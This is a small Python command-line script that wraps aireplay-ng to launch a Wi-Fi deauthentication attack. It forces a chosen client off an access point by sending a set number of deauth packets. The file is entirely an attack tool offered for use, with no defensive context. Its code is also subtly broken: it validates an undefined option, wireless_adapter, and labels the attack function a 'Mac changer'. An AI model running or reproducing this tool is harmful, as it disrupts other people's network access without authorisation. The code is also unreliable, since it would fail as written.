
import subprocess
import optparse
import re


def get_input():
    """Get input"""
    parser = optparse.OptionParser()
    parser.add_option("-a", dest="client_bssid",
                      help="client bssid")
    parser.add_option("-i", dest="interface",
                      help="interface to use")
    parser.add_option("-p", dest="deauth_pack", help="number of deauth packets")
    parser.add_option('-c',dest='client_mac')
    (options, arguments) = parser.parse_args()
    if not options.client_bssid:
        parser.error("[-] Please specify wifi bssid in use --help")
    elif not options.wireless_adapter:
        parser.error("[-] Please specify mac, use --help")
    elif not options.deauth_pack:
        parser.error("[+] please specify number of deauth packets, use --help")
    elif not options.client_mac:
        parser.error("[+] specify client mac address")
    return options


def deauth_attack(client_bssid, deauth_pack, client_mac, interface):
    '''Mac changer function '''
    print(f'deauth attack against {client_bssid}  on {client_mac}using {interface}')
    subprocess.call(['aireplay-ng', '--deauth', deauth_pack, '-a', client_bssid, '-c', client_mac, interface  ])

options = get_input()
deauth_attack(options.client_bssid, options.deauth_pack, options.client_mac, options.interface)